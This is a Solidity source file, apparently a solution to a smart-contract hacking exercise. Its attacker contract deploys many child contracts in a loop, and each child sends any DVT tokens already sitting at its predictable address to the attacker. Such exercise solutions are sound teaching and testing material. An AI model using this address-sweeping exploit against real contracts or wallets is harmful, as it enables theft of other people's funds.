pragma solidity ^0.8.0;

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract SafeMinerAttacker {
    constructor(address attacker, address dvtAddress, uint256 number) {
        for (uint256 idx; idx < number; idx++) {
            new TokenTransfer(attacker, dvtAddress);
        }
    }
}

contract TokenTransfer {
    constructor(address attacker, address dvtAddress) {
        IToken dvt = IToken(dvtAddress);
        uint256 balance = dvt.balanceOf(address(this));
        if (balance > 0) {
            dvt.transfer(attacker, balance);
        }
    }
}